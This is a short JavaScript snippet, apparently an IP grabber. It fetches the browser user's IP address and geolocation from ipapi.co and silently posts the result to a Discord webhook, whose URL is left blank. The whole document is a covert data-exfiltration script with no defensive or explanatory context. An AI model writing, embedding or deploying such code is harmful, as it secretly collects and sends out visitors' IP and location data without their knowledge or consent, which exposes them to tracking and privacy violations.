// Fetch user information from IPAPI
fetch("https://ipapi.co/json/")
    .then(response => response.json())
    .then(data => {
        // Prepare JSON payload for the webhook
        const jsonData = {
            content: JSON.stringify(data, null, 2) // Format data as a JSON string
        };

        // Send the data to the Discord webhook
        fetch("", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(jsonData)
        });
    })
    .catch(error => console.error("Error fetching IP data:", error));
